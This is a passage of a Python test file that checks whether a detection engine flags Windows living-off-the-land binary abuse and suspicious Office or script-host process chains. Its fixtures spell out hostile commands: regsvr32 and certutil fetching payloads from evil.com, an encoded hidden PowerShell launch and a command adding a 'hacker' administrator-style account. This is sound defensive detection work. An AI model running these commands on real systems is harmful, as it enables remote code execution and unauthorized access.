            command_line="rundll32.exe printui.dll,PrintUIEntry /install",
        )
        assert not _hits(engine, event, "LOLBIN_RUNDLL32_SUSPICIOUS_001")

    def test_regsvr32_squiblydoo_fires(self, engine: RuleEngine):
        event = _make_proc(
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line="regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll",
        )
        assert _hits(engine, event, "LOLBIN_REGSVR32_001")

    def test_regsvr32_normal_registration_does_not_fire(self, engine: RuleEngine):
        event = _make_proc(
            image=r"C:\Windows\System32\regsvr32.exe",
            command_line="regsvr32.exe /s C:\\Windows\\System32\\mylegit.dll",
        )
        assert not _hits(engine, event, "LOLBIN_REGSVR32_001")

    def test_certutil_urlcache_fires(self, engine: RuleEngine):
        event = _make_proc(
            image=r"C:\Windows\System32\certutil.exe",
            command_line="certutil.exe -urlcache -f http://evil.com/payload.exe C:\\payload.exe",
        )
        assert _hits(engine, event, "LOLBIN_CERTUTIL_001")

    def test_certutil_decode_fires(self, engine: RuleEngine):
        event = _make_proc(
            image=r"C:\Windows\System32\certutil.exe",
            command_line="certutil.exe -decode payload.b64 payload.exe",
        )
        assert _hits(engine, event, "LOLBIN_CERTUTIL_001")

    def test_certutil_dump_does_not_fire(self, engine: RuleEngine):
        event = _make_proc(
            image=r"C:\Windows\System32\certutil.exe",
            command_line="certutil.exe -dump certificate.cer",
        )
        assert not _hits(engine, event, "LOLBIN_CERTUTIL_001")


# ===========================================================================
# Parent-child chain rules — unchanged, regression smoke
# ===========================================================================

class TestParentChildChainSmoke:

    def test_office_powershell_chain_fires(self, engine: RuleEngine):
        event = _make_proc(
            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            image=PS,
            command_line="powershell.exe -nop -w hidden -enc JABzAD0A",
        )
        assert _hits(engine, event, "CHAIN_OFFICE_POWERSHELL_001")

    def test_office_cmd_chain_fires(self, engine: RuleEngine):
        event = _make_proc(
            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
            image=CMD,
            command_line="cmd.exe /c whoami",
        )
        assert _hits(engine, event, "CHAIN_OFFICE_CMD_001")

    def test_script_host_cmd_fires(self, engine: RuleEngine):
        event = _make_proc(
            parent_image=r"C:\Windows\System32\wscript.exe",
            image=CMD,
            command_line="cmd.exe /c net user hacker P@ssw0rd /add",
        )
        assert _hits(engine, event, "CHAIN_SCRIPT_HOST_CMD_001")

    def test_script_host_powershell_fires(self, engine: RuleEngine):
        event = _make_proc(
            parent_image=r"C:\Windows\System32\cscript.exe",
            image=PS,
            command_line="powershell.exe -enc JABzAD0A",
        )
        assert _hits(engine, event, "CHAIN_SCRIPT_HOST_POWERSHELL_001")

    def test_explorer_powershell_no_chain_fires(self, engine: RuleEngine):
        """Explorer spawning PowerShell — no chain rule covers this (benign)."""
        event = _make_proc(
            parent_image=EXPLORER,
            image=PS,
            command_line="powershell.exe Get-Process",
        )
        assert not _hits(engine, event, "CHAIN_OFFICE_POWERSHELL_001")
        assert not _hits(engine, event, "CHAIN_SCRIPT_HOST_POWERSHELL_001")
